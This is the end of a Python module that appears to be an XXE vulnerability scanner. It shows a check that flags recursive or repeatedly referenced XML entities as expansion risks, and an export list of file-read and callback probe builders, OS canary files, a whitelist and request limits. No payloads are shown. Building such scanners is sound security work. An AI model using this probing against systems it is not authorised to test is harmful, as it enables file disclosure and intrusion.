        if "&" in _CHAR_REF_RE.sub("", kind):
            reasons.append(f"实体 {match.group('name')!r} 的值里含实体引用（递归风险）")
    for name in entity_names(text):
        if text.count(f"&{name};") > 1:
            reasons.append(f"实体 {name!r} 被引用多次（膨胀风险）")
    return tuple(reasons)


__all__ = [
    "ALIVE_ENTITY",
    "ALIVE_LITERAL",
    "ALIVE_MARKER",
    "CALLBACK_WAIT_SECONDS",
    "CANARIES",
    "CANARY_LINUX",
    "CANARY_WHITELIST",
    "CANARY_WINDOWS",
    "DEFAULT_CONTENT_TYPE",
    "DEFAULT_TIMEOUT",
    "FileTargetScan",
    "GATEWAY_STATUSES",
    "MAX_REQUESTS_PER_ENDPOINT",
    "MAX_RESPONSE_BYTES",
    "PROBE_BASELINE",
    "PROBE_CALLBACK",
    "PROBE_FILE",
    "PROBE_NEGATIVE",
    "ProbeObservation",
    "ProbeSpec",
    "ROLE_BASELINE",
    "ROLE_CALLBACK",
    "ROLE_FILE",
    "ROLE_NEGATIVE",
    "SYSTEM_ENTITY",
    "TOKEN_PREFIX",
    "TemplateProbes",
    "XXE_CALLBACK_METHOD",
    "XXE_EVIDENCE_KIND",
    "XXE_FILE_METHOD",
    "XxeError",
    "XxeFileTargetError",
    "XxeJudgment",
    "alive_body",
    "baseline_body",
    "callback_body",
    "callback_control_body",
    "canary_for",
    "default_canary",
    "derive_template_probes",
    "entity_amplification_reasons",
    "entity_names",
    "file_body",
    "file_urls_in",
    "is_answered",
    "judge",
    "looks_like_soap_fault",
    "negative_body",
    "new_xxe_token",
    "nonexistent_file_url",
    "normalize_file_target",
    "probe_plan",
    "require_whitelisted",
    "scan_file_targets",
    "strip_doctype",
]
